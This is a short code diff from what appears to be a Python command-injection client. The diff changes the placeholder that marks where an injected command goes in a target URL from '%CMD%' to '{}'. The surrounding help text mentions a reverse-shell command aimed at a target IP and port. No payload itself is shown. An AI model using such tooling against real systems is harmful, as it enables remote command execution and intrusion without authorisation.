@@ -145,8 +145,8 @@ def show_help(cmd=None):
   elif cmd == "shell":
     sys.stdout.write(".shell <ip_address> <port> - initiate reverse shell to target\n")
   elif cmd == "url":
-    sys.stdout.write(".url <string> - set the target URL to string. Use '%CMD%' to specify where command injection goes.\n")
-    sys.stdout.write("                if %CMD% is not set, 'cmd' param will automatically be appended.\n")
+    sys.stdout.write(".url <string> - set the target URL to string. Use '{}' to specify where command injection goes.\n")
+    sys.stdout.write("                if {} is not set, 'cmd' param will automatically be appended.\n")
   elif cmd == "useragent":
     sys.stdout.write(".useragent - show the User-Agent string\n")
     sys.stdout.write(".useragent <string> - set the value for User-Agent\n")
@@ -532,8 +532,8 @@ while True:
         pass
 
     ## validate the URL format
-    if '%CMD%' in cfg.url:
-      query = cfg.url.replace('%CMD%', cmd.strip())
+    if '{}' in cfg.url:
+      query = cfg.url.replace('{}', cmd.strip())
     else:
       if '?' in cfg.url:
         if 'cmd=' not in cfg.url:
